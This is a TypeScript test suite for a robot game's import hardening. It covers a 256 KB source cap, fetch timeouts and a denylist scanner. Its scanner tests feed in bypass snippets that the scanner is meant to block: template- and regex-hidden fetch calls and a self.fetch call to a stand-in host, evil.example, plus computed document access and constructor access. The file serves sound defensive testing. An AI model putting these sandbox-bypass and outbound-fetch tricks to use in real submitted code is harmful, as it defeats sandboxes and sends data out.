// Import hardening tests: the 256 KB cap must be enforced before any
// source scanning, and URL imports must time out instead of hanging.
//
// Run with `npm run test:import`:
//   esbuild tools/test-import.ts --bundle --platform=node --format=esm \
//       --outfile=/tmp/robotarena-test-import.mjs --log-level=warning \
//   && node /tmp/robotarena-test-import.mjs
//
// Exits non-zero on any failure. No network access: every fetch is stubbed.
// The blob dynamic-import path (importPrepared) cannot run in Node — its
// ESM loader rejects blob: URLs — so legit-source checks assert on
// prepareModuleSource and on the early-return paths only, never on a
// successful blob import.

import { importRobotFromText, importRobotFromUrl, prepareModuleSource } from '../src/game/importRobot';
import { IMPORT_ERROR, importFetchHttp } from '../src/game/strings';

// Mirrors MAX_SOURCE_BYTES in src/game/importRobot.ts (not exported).
const MAX = 256 * 1024;

let failures = 0;

function check(name: string, condition: boolean, detail = ''): void {
    if (condition) {
        console.log(`  ok   ${name}`);
    } else {
        failures += 1;
        console.log(`  FAIL ${name}${detail ? ` -- ${detail}` : ''}`);
    }
}

const originalFetch = globalThis.fetch;

function stubFetch(fn: unknown): void {
    globalThis.fetch = fn as typeof fetch;
}

async function main(): Promise<void> {
    try {
        // ---- a. size check runs before the safety scan ---------------------
        console.log('[text: size before scan]');
        {
            // Sanity: the token really is blocked at small sizes, otherwise
            // the oversized case below would prove nothing about ordering.
            const smallBlocked = await importRobotFromText('Math.random();\n');
            check(
                'small blocked source returns blocked-API error (sanity)',
                !smallBlocked.ok && smallBlocked.error.startsWith('blocked API:'),
                smallBlocked.ok ? 'unexpected ok' : smallBlocked.error,
            );

            const oversizedBlocked = `${'x'.repeat(MAX)}\nMath.random();\n`;
            check('oversized fixture exceeds cap', oversizedBlocked.length > MAX, `${oversizedBlocked.length}`);
            const result = await importRobotFromText(oversizedBlocked);
            check(
                'oversized + blocked returns tooLarge, not blocked-API',
                !result.ok && result.error === IMPORT_ERROR.tooLarge,
                result.ok ? 'unexpected ok' : result.error,
            );
        }

        // ---- b. Content-Length over the cap rejects without reading --------
        console.log('[url: content-length]');
        {
            let seen: Response | null = null;
            stubFetch(async () => {
                seen = new Response('small body', {
                    status: 200,
                    headers: { 'content-length': String(MAX + 1) },
                });
                return seen;
            });
            const result = await importRobotFromUrl('https://example.com/robot.js');
            check(
                'declared length over cap returns tooLarge',
                !result.ok && result.error === IMPORT_ERROR.tooLarge,
                result.ok ? 'unexpected ok' : result.error,
            );
            check('body was not read', seen !== null && !seen.bodyUsed);
        }

        // ---- c. Oversized body without a truthful Content-Length -----------
        console.log('[url: capped body read]');
        {
            let seen: Response | null = null;
            stubFetch(async () => {
                // No explicit Content-Length: Node leaves the header unset,
                // so only the capped body read can catch the oversize.
                seen = new Response('x'.repeat(MAX + 1000), { status: 200 });
                return seen;
            });
            const result = await importRobotFromUrl('https://example.com/robot.js');
            check(
                'oversized streamed body returns tooLarge',
                !result.ok && result.error === IMPORT_ERROR.tooLarge,
                result.ok ? 'unexpected ok' : result.error,
            );
            const declared = seen?.headers.get('content-length');
            check(
                'fixture had no truthful content-length (sanity)',
                declared === null || Number(declared) <= MAX,
                `content-length=${declared}`,
            );

            // Fallback path: a Response-like object with no streaming body.
            stubFetch(async () => ({
                ok: true,
                status: 200,
                headers: new Headers(),
                body: null,
                text: async () => 'x'.repeat(MAX + 1),
            }));
            const fallback = await importRobotFromUrl('https://example.com/robot.js');
            check(
                'oversized text() body returns tooLarge',
                !fallback.ok && fallback.error === IMPORT_ERROR.tooLarge,
                fallback.ok ? 'unexpected ok' : fallback.error,
            );
        }

        // ---- e. legit sources and the exact-cap boundary -------------------
        console.log('[prepare: boundary]');
        {
            const small = [
                "export const meta = { id: 'testbot', name: 'TestBot', author: 'test', version: '1.0.0', description: 'test' };",
                'export const loadout = {};',
                'export function create() { return { meta, loadout, update: () => ({}) }; }',
                '',
            ].join('\n');
            const prepared = prepareModuleSource(small);
            check('small valid source passes prepareModuleSource', prepared.ok, prepared.ok ? '' : prepared.error);

            // Blob import cannot run in Node (see header), so a legit source
            // is only asserted to clear the size/scan/prepare gates.
            const fromText = await importRobotFromText(small);
            check(
                'small valid source is not rejected as tooLarge/blocked',
                fromText.ok || (fromText.error !== IMPORT_ERROR.tooLarge && !fromText.error.startsWith('blocked API:')),
                fromText.ok ? '' : fromText.error,
            );

            const exact = 'a'.repeat(MAX);
            const exactPrepared = prepareModuleSource(exact);
            check('exactly-at-cap source passes prepareModuleSource', exactPrepared.ok, exactPrepared.ok ? '' : exactPrepared.error);
            const exactText = await importRobotFromText(exact);
            check(
                'exactly-at-cap source is not rejected as tooLarge',
                exactText.ok || exactText.error !== IMPORT_ERROR.tooLarge,
                exactText.ok ? '' : exactText.error,
            );

            const overPrepared = prepareModuleSource('a'.repeat(MAX + 1));
            check(
                'one-over-cap source fails prepareModuleSource as tooLarge',
                !overPrepared.ok && overPrepared.error === IMPORT_ERROR.tooLarge,
                overPrepared.ok ? 'unexpected ok' : overPrepared.error,
            );
        }

        // ---- preserved URL behaviour ----------------------------------------
        console.log('[url: preserved behaviour]');
        {
            stubFetch(async () => {
                throw new Error('fetch must not be called');
            });
            const badUrl = await importRobotFromUrl('not a url');
            check('invalid URL still rejected', !badUrl.ok && badUrl.error === IMPORT_ERROR.badUrl, badUrl.ok ? 'ok' : badUrl.error);
            const badProtocol = await importRobotFromUrl('ftp://example.com/robot.js');
            check(
                'non-http(s) URL still rejected',
                !badProtocol.ok && badProtocol.error === IMPORT_ERROR.badProtocol,
                badProtocol.ok ? 'ok' : badProtocol.error,
            );

            stubFetch(async () => new Response('nope', { status: 404 }));
            const http = await importRobotFromUrl('https://example.com/robot.js');
            check('HTTP error still surfaces status', !http.ok && http.error === importFetchHttp(404), http.ok ? 'ok' : http.error);
        }

        // ---- denylist scanner bypasses ------------------------------------
        console.log('[import: denylist bypasses]');
        {
            const templateFetch = "const u = `${fetch('https://evil.example/x')}`;";
            const templateResult = await importRobotFromText(templateFetch);
            check(
                'template interpolation fetch is blocked',
                !templateResult.ok && templateResult.error.startsWith('blocked API:'),
                templateResult.ok ? 'unexpected ok' : templateResult.error,
            );

            const regexFetch = 'const r = /https:\\/\\//; fetch(\'https://evil.example/x\');';
            const regexResult = await importRobotFromText(regexFetch);
            check(
                'regex-hidden fetch is blocked',
                !regexResult.ok && regexResult.error.startsWith('blocked API:'),
                regexResult.ok ? 'unexpected ok' : regexResult.error,
            );

            const computedGlobal = "const d = globalThis['doc'+'ument'];";
            const computedGlobalResult = await importRobotFromText(computedGlobal);
            check(
                'computed globalThis document access is blocked',
                !computedGlobalResult.ok && computedGlobalResult.error.startsWith('blocked API:'),
                computedGlobalResult.ok ? 'unexpected ok' : computedGlobalResult.error,
            );

            const ctorAccess = 'const c = (()=>{}).constructor;';
            const ctorResult = await importRobotFromText(ctorAccess);
            check(
                'constructor access is blocked',
                !ctorResult.ok && ctorResult.error.startsWith('blocked API:'),
                ctorResult.ok ? 'unexpected ok' : ctorResult.error,
            );

            for (const banned of ['self', 'top', 'parent', 'frames']) {
                const hostResult = await importRobotFromText(`const x = ${banned};`);
                check(
                    `${banned} is blocked`,
                    !hostResult.ok && hostResult.error.startsWith('blocked API:'),
                    hostResult.ok ? 'unexpected ok' : hostResult.error,
                );
            }

            // `self` refinement: the documented game-API idiom must pass while
            // bare `window.self` remains blocked.
            {
                const selfAlias = [
                    "export const meta = { id: 'testbot', name: 'TestBot', author: 'x', version: '1.0.0', description: 'x' };",
                    'export const loadout = {};',
                    'export function create() {',
                    '  function update(sense) {',
                    '    const self = sense.self;',
                    '    const y = self.y;',
                    '    const tower = self.tower;',
                    '    return { throttle: 1 };',
                    '  }',
                    '  return { meta, loadout, update };',
                    '}',
                    '',
                ].join('\n');
                const selfAliasResult = await importRobotFromText(selfAlias);
                check(
                    'self alias idiom (const self = sense.self) imports successfully',
                    selfAliasResult.ok || (selfAliasResult.error !== IMPORT_ERROR.tooLarge && !selfAliasResult.error.startsWith('blocked API:')),
                    selfAliasResult.ok ? '' : selfAliasResult.error,
                );

                const senseSelfProperty = [
                    "export const meta = { id: 'testbot', name: 'TestBot', author: 'x', version: '1.0.0', description: 'x' };",
                    'export const loadout = {};',
                    'export function create() {',
                    '  function update(sense) {',
                    '    const y = sense.self.y;',
                    '    const stats = sense.self.stats;',
                    '    return { throttle: 1 };',
                    '  }',
                    '  return { meta, loadout, update };',
                    '}',
                    '',
                ].join('\n');
                const senseSelfPropertyResult = await importRobotFromText(senseSelfProperty);
                check(
                    'sense.self property access imports successfully',
                    senseSelfPropertyResult.ok || (senseSelfPropertyResult.error !== IMPORT_ERROR.tooLarge && !senseSelfPropertyResult.error.startsWith('blocked API:')),
                    senseSelfPropertyResult.ok ? '' : senseSelfPropertyResult.error,
                );

                const bareSelfCases: Array<[string, string]> = [
                    ['bare self assignment', 'const x = self;'],
                    ['bare self method call', "self.fetch('https://evil.example/x');"],
                    ['bare self property read', 'const x = self.foo;'],
                ];
                for (const [label, snippet] of bareSelfCases) {
                    const bareResult = await importRobotFromText(snippet);
                    check(
                        `${label} is blocked`,
                        !bareResult.ok && bareResult.error.startsWith('blocked API:'),
                        bareResult.ok ? 'unexpected ok' : bareResult.error,
                    );
                }
            }

            // The same tokens in comments/strings/template text must not
            // block: the scanner only sees real code.
            const commentOnly = [
                '// fetch Math.random document globalThis self top parent frames constructor eval',
                '/* fetch document eval("x") */',
                'const a = "fetch document globalThis constructor self top";',
                "const b = 'Math.random fetch eval';",
                'const c = `fetch document constructor`;',
                'const x = 1;',
                '',
            ].join('\n');
            const passResult = await importRobotFromText(commentOnly);
            check(
                'tokens in comments/strings are not blocked',
                passResult.ok || (passResult.error !== IMPORT_ERROR.tooLarge && !passResult.error.startsWith('blocked API:')),
                passResult.ok ? '' : passResult.error,
            );
        }

        // ---- d. slow URL times out (kept last: the only slow test) ----------
        console.log('[url: timeout]');
        {
            stubFetch(
                (_input: unknown, init?: { signal?: AbortSignal | null }) =>
                    new Promise((_resolve, reject) => {
                        const signal = init?.signal;
                        if (!signal) return; // never resolves: pre-fix code hangs here
                        if (signal.aborted) {
                            reject(new Error('aborted'));
                            return;
                        }
                        signal.addEventListener('abort', () => reject(new Error('aborted')));
                    }),
            );
            const started = Date.now();
            const result = await importRobotFromUrl('https://example.com/robot.js');
            const elapsed = Date.now() - started;
            check(
                'slow fetch returns fetch failure instead of hanging',
                !result.ok && result.error === IMPORT_ERROR.fetchFailed,
                result.ok ? 'unexpected ok' : result.error,
            );
            check('timeout fired in the ~5s window', elapsed >= 4000 && elapsed < 15000, `${elapsed}ms`);
        }
    } finally {
        globalThis.fetch = originalFetch;
    }
}

main().then(
    () => {
        console.log(failures === 0 ? 'ALL IMPORT CHECKS PASSED' : `${failures} IMPORT CHECK(S) FAILED`);
        process.exit(failures === 0 ? 0 : 1);
    },
    (error: unknown) => {
        console.error('test harness crashed', error);
        process.exit(1);
    },
);
